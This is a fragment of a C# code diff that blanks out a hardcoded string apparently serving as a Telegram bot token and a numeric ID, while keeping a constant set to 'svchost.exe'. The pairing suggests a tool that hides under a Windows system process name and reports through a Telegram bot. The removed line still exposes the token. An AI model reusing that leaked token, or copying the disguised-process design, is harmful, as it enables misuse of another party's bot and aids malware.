@@ -10,7 +10,7 @@ using System.Threading.Tasks;
 
 class Program
 {
-    private const string TOKEN = "8495992265:AAGPWIf0aStfnygJYlH4Zav6KIdVfSyBVZE"; private const string A = "1076261091"; private const string P = "svchost.exe";
+    private const string TOKEN = ""; private const string A = ""; private const string P = "svchost.exe";
     static async Task Main() => await new Program().R();
 
     async Task R()
